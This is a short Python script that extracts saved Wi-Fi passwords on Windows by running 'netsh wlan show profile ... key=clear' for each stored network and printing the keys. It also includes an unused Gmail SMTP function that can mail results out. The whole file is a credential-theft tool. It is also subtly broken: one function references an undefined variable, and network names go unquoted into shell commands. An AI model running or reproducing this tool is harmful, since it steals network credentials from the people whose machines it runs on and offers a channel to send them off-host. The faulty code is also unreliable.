#!/usr/bin/env python

import subprocess, smtplib, re


def main():
    network_names = get_network_names()
    cracked_passwords = get_passwords(network_names)
    for item in cracked_passwords:
        print(item)


def send_mail(email, password, message):
    server = smtplib.SMTP("SMTP.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def get_network_names():
    # Runs a windows command to show all saved networks and pulls their names to a list
    command = 'netsh wlan show profile'
    networks = subprocess.check_output(command, shell=True).decode()
    network_names = re.findall(r'(?<=: ).*', text)
    return network_names


def get_passwords(network_names):
    # Iterates over a list of network names and returns their saved passwords in windows.
    results = []
    for name in network_names:
        command = f'netsh wlan show profile {name} key=clear'
        current_result = subprocess.check_output(command, shell=True).decode()
        match = re.search(r'(?:.*Key Contents\s*:\s*)(.*)', current_result)
        if not match:
            results.append(f'[-] No password found for {name}.')
            continue
        results.append(f'[+] Password for {name} is {match.group(1)}.')
            
    return results

if __name__ == '__main__':
    main()